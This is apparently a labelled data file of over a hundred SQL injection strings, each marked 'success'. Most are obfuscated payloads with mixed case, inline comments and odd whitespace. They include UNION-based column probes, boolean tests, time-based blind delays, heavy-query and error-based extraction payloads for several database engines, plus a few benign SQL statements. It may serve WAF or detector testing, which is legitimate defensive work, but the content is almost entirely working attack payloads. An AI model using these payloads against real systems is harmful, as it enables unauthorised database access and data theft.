1 success '0x1") AS/**/amak whERe 2168 LIKE 2168/**/aNd 828 NOT LIKE 829 aNd elt(\'OVk\x0c\'\x0cnot like \'OVk\x0c?\',sleep(5))-- '
5 success '-5524)/**/AS eoyk WHere 6928=6928\x0bunion all\x0cseLeCT 6928,6928,6928,6928,6928,6928,6928,6928,6928-- '
16 success "-3433') WhEre\n0x2073 LIKE 8307/**/union/*QR*/all SELEcT\n8307,8307,8307,8307,8307,8307,8307,8307-- S9o"
17 success "1'/**/anD 0xe7b lIKe (sEleCT count(*) FROm sysibm.systables aS/**/t1,sysibm.systables\x0bAs t2,sysibm.systables as t3) "
22 success '-4926" where\x0b8152=0x1fd8 OR 4426<>4426 or/**/4339 LIKE 5547# '
36 success "0x1'/**/In boolean mode) union all\nselECT/**/null,null,null# Z"
42 success '1/*XlRs}*/WHErE 0x1644=5700;SeLeCt pg_sleep(5)--\xa09'
49 success "-9771'/**/or 5113=5365 "
52 success '-0xc93")/**/order\x0cby\xa00x1-- '
55 success '-9183") AS wctu wheRe 2058 LiKe 2058 Or 3038 LIKE 3038 '
57 success '-2411 oR (7037 LIKE 7037\x0cOR False)*4906# pxwg '
101 success '0x1 anD/**/(0x7b9 likE 6852)*0x1ac4--/**/clxl\xa0i'
103 success '-0x1846"/**/union all sELECT/**/3323,0xcfb# \''
108 success '0x1 aND 8514 LIke (SeLect count(*) fROm domain.domains aS\x0ct1,domain.columns AS/**/t2,domain.tables As t3)# miji/**/'
111 success "-2248'+(SelecT wuow WHeRE 4421=4421 OR 5108 not like 5108/**/union all SeLeCt 4421,4421,0x1145,4421,4421,4421-- "
112 success "-1886'/**/where 5518=5518 OR 0 or/**/4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else/*m*/0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(0x71))-- "
118 success '-1681%"/**/union all\nSelECT/*IK\n*/8180,8180,8180,8180,8180,8180,8180,8180,8180,8180# '
119 success '-2817)/**/where 1212=1212 AND True or\t3266 like 1102 '
121 success '-0xe36" union\nall/**/SeLEcT\xa04394,4394,0x112a,4394,4394,4394,4394-- +g]'
122 success "0x1'/**/union\x0call\x0cSeleCT/**/null,null,null,null,null,null,null,null,null,null#/**/7B"
133 success "0x1) AS svkf WHeRE 4210 LIKE 4210 anD True/**/AND 'V1>' NOT LIKE 'V1>t'\x0bANd True Or char(75)||char(70)||char(99)||char((SELECT 83))=regexp_substring(repeat(lEFt(crypt_key(char(65)||char(69)||char(83),null),0x0),500000000),null)-- "
134 success "0x1'/**/or 6793=(select\x0b6793/**/from/**/pg_sleep(0x5))/*!@P\ta*/and 'hokd'='hokd "
140 success '1/**/aNd elt(0x1099 lIke 4249,7259)#/*qEM*/lwyo '
143 success '-6086" union all/**/SeLect 8700,8700,8700,8700-- '
147 success "1'\nwheRe 2661 liKe 2661 ANd True;SElect count(*) fROM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--/**/"
149 success "0x1'\x0cWhEre 9101 lIke 9101 union all sElECt null# "
164 success '-3104"\nunion/**/all select 0x1655,5717,5717,5717,5717,5717,5717,5717,5717-- '
175 success '0x1%"/**/aNd 1343\tLIKE 5939# W'
180 success '-3321" WHEre\xa01603=1603 OR False OR\t0/*\\C*/union all sElect 1603,1603,1603,1603# '
183 success '0x1/**/union all SElECt\xa0null,null,null,null,null,null,null,null,null,null# '
186 success '1 wHERE 4784 NOT LIKE 4785/*&*/anD 0x2426=(SELeCt count(*) FRom rdb$fields aS t1,rdb$types AS t2,rdb$collations aS t3,rdb$functions As/**/t4)-- '
190 success "1'/**/WherE 8083 liKE 0x1f93/**/And updatexml(3393,concat(0x2e,0x7171706a71,(SELeCT (elt(3393/**/LIke (select 3393),1))),0x717a767a71),1161)--\xa0"
202 success "0x1%'/**/oR 4240 LIKE (SeLEcT 4240/**/froM/**/pg_sleep(5))-- "
206 success "seLeCT prod_subcategory_desc As subcategory, calendar_quarter_desc aS quarters, calendar_month_desc as months, trunc(amount_sold,0) as sales, trunc(sum (amount_sold) over (order by prod_subcategory_desc),0) psc_sales, trunc(sum (amount_sold) over (),0) tot_sales FrOM chan_prodcat_monthly_sales WHERE calendar_year_id\t LIKE '1803' order by prod_subcategory_desc, calendar_quarter_desc, calendar_month_desc "
208 success '0x1 oR 0x113b like (SeLect/**/count(*) FroM sysusers AS sys1,sysusers aS sys2,sysusers As sys3,sysusers As sys4,sysusers\nas sys5,sysusers As sys6,sysusers AS sys7)-- ctdx '
209 success '1\twHere 3522 LiKE 3522 union all sElEct null-- '
215 success "1'/**/where/*gCDH*/'WTB`'='WTB`' union all select/**/null,null,null,null# _"
228 success '-8868") WherE 6567 NOT LIKE 6568 AND True AND True union all seLEcT 5681,5681,5681,5681,5681,5681,5681,5681,5681,5681-- '
231 success '0x1" wheRE 5235<>5236 union all seleCT null,null,null,null,null,null,null#/**/'
234 success '-9062"/**/or 6872=6872 AND 0xc0e!=3087 and "aumq"\nlike "aumq '
241 success "-6220' union/**/all sELECT 1462,1462#/**/N"
242 success '0x1) aS afxc wheRe 7497 like 0x1d49;SElEcT count(*)\x0bfrOm rdb$fields AS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions As t4-- (SELECT 8)'
250 success '-1351"/**/whErE 3831 IN (3830,3831,3832) OR 5684=8582 '
252 success '0x1) wHere\n627 NOT LIKE 628 OR False;SEleCt count(*) FROm generate_series(0x1,0x4c4b40)--\t'
262 success "1'/**/in boolean mode)/*h*~U*/or/*cJMW*/char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char((SELECT 83)),null),0),(SELECT 500000000)),null)# "
264 success "-9721'/**/oR\telt(9511=0x2416,9238)/**/"
272 success "-2602' union/**/all\xa0SeLECT 5715,5715,5715,5715,5715,5715,5715,5715,5715--/*]cx*/"
274 success '-8143) union all SELeCt 3014--/**/.d'
280 success '0x1) whErE 4573 LIke 0x11dd OR 0x1006 not\xa0like 4102 && True;sElecT count(*) From all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- '
281 success "-0x1353' order by 0x1# "
292 success "-3300'\nunion\nall/**/select 0x2313,8979,8979,8979,8979,0x2313--/**/"
300 success '-5728) WHeRe/**/4304 NOT LIKE 4305 Or False union\nall SeLECT 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663# '
305 success "-1643' whErE 1968=1968  OR /**/3484=0x19f2 "
319 success '0x1  Or  0x93f=(sElECT count(*) fROm rdb$fields As t1,rdb$types aS t2,rdb$collations As t3,rdb$functions aS t4)--/*&*/'
328 success '-9541 wHEre 4291 LiKe\xa04291 Or 2724 iN ((char(113)+char(113)+char(112)+char(106)+char(113)+(SeleCT (cAse WHEN (2724=2724) then char(49) ElSE char(48) eND))+char(113)+char(122)+char(118)+char(122)+char(113)))-- '
330 success '-0x1e45"/**/OR/**/(2689=7481)*7481 '
336 success '-2912")/**/AS eizh/**/WhERE 9828/**/in/*05?E*/(9827,9828,9829) oR\tmake_set(1041=3056,3056)--\n'
355 success '0x1;seLeCT\x0csleep(5)/*uKi|*/'
367 success "1'/**/WHEre 0x23f6 LIKE 9206;SELECT count(*) FrOM sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables as t3-- W2"
386 success '-4865/**/wHErE/**/1386=0x56a union all\x0cselEcT 1386,(SELECT 1386),1386,1386# '
389 success '-6803") order/**/by 0x1# '
391 success "0x1%'\x0caND 0x6c8 LiKe 4220 "
412 success "-2483' where/**/9991 LIKE 9991 AND 9501<>9502 union all select 1327# "
418 success "0x1%'/*;c*/aND 0x2426=(sELEct count(*) fRoM/**/rdb$fields aS t1,rdb$types AS t2,rdb$collations AS t3,rdb$functions aS t4)-- "
430 success '-7683") Where 9664 liKe 9664  ANd \n1 union/**/all\x0cseLEcT/*I*/9664,9664,9664,9664,9664,9664,9664#/*r>KO*/'
441 success "1'/*wxhbz*/In boolean mode) Or/**/char((sELEct 75))||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65) or char(69)||char(83),null),0),500000000),null)--\x0c"
448 success "1'\x0bunion/*ySU|]*/all\x0bselEcT/**/null,null,null,null,null,null,null,null,null--\x0b"
457 success "1'/**/WHERe 0x2309=8969 union all SeleCT null,null,null,null,null-- "
472 success "1 whERE 9393 LIKE 0x24b1 waitfor delay/*e.y4*/'0:0:5'-- ["
492 success "(SELECT/**/1)%'/**/order by/**/1-- "
493 success '1 wHERe/**/3175 Like/**/3175 OR/**/8421 LIKE (sElECt\x0bcount(*) FRom/**/generate_series(0x1,5000000))--/**/'
509 success '1/*\ntB*/where 1776=1776 OR False\nand char(107) OR char(0x79) OR char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--/**/'
522 success '-2936) OR 6872=6872 '
527 success "-7404' WHeRE 1536 like 1536/**/order by 1# VK"
530 success "1'+(SElect iowv wHERe 6105 LIKe 6105 Or False AND sleep(5)# "
537 success '-2838"\x0bWHeRE\xa00x1542 like 5442/**/union all SElecT 5442# jo'
540 success '0x1;begin/**/dbms_lock.sleep(0x5);/*}\t*/enD--/**/elvi\np'
542 success '-8432) union all/**/selecT 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169-- '
550 success '1\'\x0bwhere/*W"kna*/6035=(SELECT\n6035) waitfor/**/delay \'0:0x0:5\'--\t'
554 success '1\x0bWHERe/**/0x1bf6/**/likE 7158 OR/**/elt(5873 LiKE/**/5873,sleep(5))# '
555 success 'SELECt @shipdate  lIKe  dateadd(day,6,@orderdate), @duedate LIKe \tdateadd(day,0xc,@orderdate) '
559 success '1/**/where 6304 lIke\x0b6304 AND 3766<>3767\tanD True;begin dbms_lock.sleep(5); enD-- ['
561 success "0x1'/**/iN boolean mode) union\nall sELeCt null,null# "
565 success 'sEt\xa0@dateto = isnull/**/(@dateto, getdate()) '
568 success '0x1)/**/union\x0call/**/SElecT null,null,null--/**/'
570 success '1 whERE 8102 LIKE 8102 aNd 9198 like 9198-- Z'
575 success "0x1%'/**/union\tall/**/select/**/null,null,null,null,null,null--/**/"
577 success "-1170'/**/union all SELeCt\n4663,4663,4663,4663,4663,4663,(SELecT 4663),0x1237# dS"
624 success "1'+(selEcT/**/sijr\xa0WHerE 7250=0x1c52;If(1665 LIKE 3845) selecT 1665 ELSe Drop function nzod-- r"
626 success "sElEcT prod_subcategory_desc as subcategory, calendar_month_desc as month, amount_sold as sales, sum(amount_sold) over (order by prod_subcategory_id, calendar_month_desc) As cum_sales fROm prodcat_monthly_sales WHERE calendar_year_id  LiKe '1803' order by prod_subcategory_id, calendar_month_id "
644 success '0x1 WHere 0x8bf Like 2239 aND 6969=(seLEcT/**/6969/**/froM pg_sleep(5))-- '
658 success "-2254')/*]-*/As\ndyrv\x0cwHeRe 9079 LIke 9079 OR False OR False oR 1920 not like/**/1920 union/**/all seleCt 9079,9079,9079,9079,9079,9079,9079,9079# fq"
673 success '-4885 union all SEleCt 4589,4589,4589,4589,4589,4589,4589,4589,4589,4589# \x0c '
674 success "seLEcT\x0bp.id, p.producttypeid, producttype = pt.name, p.code, p.name, p.sysid, p.sortorder, active  LIke  CasE p.active WhEN 0x1 thEn 'y' ELSE 'n' enD, p.createdby, p.createdon, p.lasteditby, p.lastediton, si.branchid, dt.groupname, dt.suplvl1name From products p inner join saleitems si ON si.productuid = p.id inner join producttypes pt On pt.id = p.producttypeid inner join directorytreeproductsmap dtpm oN p.id = dtpm.productid inner join vwdirectorytreehierarchy dt ON dt.groupid = dtpm.directorytreeid wHeRe p.active = 0x1 And si.branchid IN (0, @branchid) END "
686 success "-0x895' union/**/all SeleCT 8065,8065,8065,8065--\xa0"
694 success "-5970' wHeRE/**/2769=2769 union all SEleCt 2769-- "
715 success "0x1',(CaSE WheN 2872 Like 0xb38 then 0x1 ELSe null\x0beND)/*C;yd**/"
729 success "1'+(SELEct lang wHERe/*:O`u_*/0x105f=4191\x0cunion all SEleCt null,null# "
732 success "-5516'+(select/**/'bmlv' WhErE 7188=7188 Or False\x0boR\t0x0 union\xa0all selEct/**/7188,7188,7188,7188,7188,7188,7188,7188# :"
738 success "-0x2650'/**/IN boolean\tmode) union all SeLecT 2528,2528,2528,2528,2528,2528,2528-- ^"
741 success '-1499) as\x0bgxfm where/**/1149 LIKE 1149 AND True AND True\xa0or 0x1765=4782-- '
750 success '-9119") wHerE 9237 LIKE 9237 Or 8571=8571--/**/'
755 success "-5432') aS dndq wheRE 9633/**/LikE 0x25a1\norder\x0cby/**/1# "
781 success "-8588'/**/union\x0ball SELeCT (sElecT 2135),2135-- "
800 success '0x1)/**/or 8466/**/lIke/**/benchmark(5000000,md5(0x694a4745)) aNd (3901<>3902/**/'
804 success '0x1") wHEre\xa06554<>6555 OR 6793 NOT LIKE 6793 or 4296<>4296 aNd True oR 9523<>9523 AND (SElEcT (SELECT 9660))=(SelecT count(*) fROM all_users t1,all_users t2,all_users t3,all_users t4,all_users\nt5)-- '
812 success "-8023' or/**/6872=6872 OR False "
825 success "1'/**/where/**/9003=9003\x0bAND/**/7396=7396/**/waitfor/**/delay\xa0'0:0:5'--\n"
841 success '-4331)\naS inpx wheRe\n0x264c=0x264c union/**/all Select (selECt 0x264c)# '
859 success '-5425 whERE 5933 like 5933 union all Select 5933,5933,5933-- '
868 success '-8015) where 9808=9808/*!j+-\n*/or 8993!=8994# '
879 success '1\nWhErE/**/8390=8390/**/ANd 9314<>9315 ANd 3436<>3437 ANd 0x317!=792 aNd\n3824=benchmark(5000000,md5(0x76555642))-- '
885 success '0x1;selEct pg_sleep(5)--/*p\nm<*/'
887 success "1'\xa0AND/**/sleep(5) "
889 success "0x1'/**/in boolean mode);begin\tuser_lock.sleep(5); enD# Ku:"
890 success '0x1)/**/WHere 9344=9344 OR/*U*/0x68a LiKe 1675;SElecT (CAsE wHEn (4769=0x12a1) THen\x0b4769\x0celSE 4769*(SElECT 4769 From mysql.db)/**/EnD)# '
904 success '-0x26a3" union all SElECT 7489# '
917 success "0x1' WHERE 0xe74 LIkE 0xe74 union all sELecT null,null,null--\n"
922 success "1'\xa0WHeRE 8182/**/Like 0x1ff6 order by 0x1#\xa0[-I"
924 success "iF/**/object_id('dbo.spgeneratedatedimension') is not null DRoP\tprocedure/*a*/[dbo].[spgeneratedatedimension] "
956 success '-3445/**/union\x0ball select\x0c5505,5505,5505-- ip'
960 success '1/**/ OR /*}w(*/(SELECT * from (sELEcT(sleep((seleCt\n5))))ydpu)\n'
961 success '-9697) union/**/all select 3052,3052,3052,3052,3052,3052,3052,3052,3052-- '
963 success '-5891) WhERe 5792 LIKE 5792 OR False union/**/all SeLECt 0x16a0,5792,5792,5792,5792# '
968 success '-8349) union all/**/SELect 8126,8126#\x0bJKZ'
969 success '-6145/**/or (8459=8459)*4906-- yklv '
970 success "0x1') aS uwmy WhERE/**/6980 like 6980 OR False AND 2149 not like 2150 AND 3924<>3925;sElEct (case/**/WHen (9195!=9196 AND True) THEn 3855 ElsE 1/(selEct/*b*/0)\xa0eND)--\t"
977 success '1/**/AnD make_set(9542 LikE 8888,8888)--\x0cidkn\xa0'
981 success '-4679 where 477 NOT LIKE 478 union/**/all select 9634,9634,9634,9634,9634,9634,9634-- '
994 success '1 WheRE 7802/*vH*/LIKE 7802;selEct count(*) froM domain.domains As t1,domain.columns as t2,domain.tables as t3-- '
999 success "1'\x0bwhere 1692 LIKE 1692;begin dbms_lock.sleep(5); end-- "
1003 success "0x1) aS nwfz WhERe 7365=7365 OR 1204!=1204 aND 2581=2581/**/AND 4386=utl_inaddr.get_host_address(chr(113) or chr(113)||chr(112)||chr((SeLecT 106))||chr(113)||(SeLECT (CASE WHen ('q%' not like 'q%\\' anD 1 ANd 'D+e/a' NOT LIKE\xa0'D+e/aK') then 1 else 0 eND) FRom\xa0dual)||chr(113)||chr(122) OR chr(118)||chr(122) Or chr((seLecT (SElECt 113))))-- "
1022 success '0x1;begin/**/user_lock.sleep(0x5);\x0ceNd-- Wm'
1030 success '0x1" wHere 3155 NOT LIKE 3156 OR 0 And 3580 LIKE (SEleCt count(*) FRom domain.domains as t1,domain.columns As/*n*/t2,domain.tables aS t3)-- '
1044 success '0x1)/**/WhERe/**/4548=4548\x0canD 9198\x0cLIKE 9198-- *U'
1050 success "1'+(seLEcT niht WherE 7294 liKE 7294 AND True\noR 6609 NOT LIKE/**/6609 And 3580=(SeLect count(*) frOm domain.domains As t1,domain.columns as t2,domain.tables as t3)-- "
1053 success '0x1")/*!*/as drrx WhERe\xa09322 LiKe 9322 OR 3401 LIKE 3402 union all SELECT null,null,null-- '
1069 success '0x1) union all/**/select/**/null,null,null,null#/**/o\t/'
1070 success '1 WHEre 5311/**/LIKe/**/5311\x0crlike (SeLecT/**/* FROm/*&*/(SELECT(sleep(5)))vwyq)#/**/'
1071 success "1'+(seLeCT rwse wheRe/**/716 LIKE 716 union\nall sELECt null,null,null,null,null,null,null-- {q"
1076 success "1'+(SeLECT/*P*/vfmy wherE/**/5711 Like\x0c5711 OR 0;iif(5214=7412,1,1/0) "
1080 success '-4248 wherE 3288/**/LikE 3288 OR 1288!=1288/*\t*/Or 4144 like (sELECt\nupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(SElecT (cAse WheN (4144=4144) ThEN 1 elSe\x0c0 END) from dual)||chr((SELECT 113))||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) FROM dual)-- '
1082 success "-1218' union/**/all SEleCT 2663,2663,2663,2663-- "
1090 success "-0xfc0')\x0bwHErE 1092 not like 1093 AND 1073 NOT LIKE 1074 OR/**/False OR 0x0 ||/**/0x711 like\xa02810# blv\t"
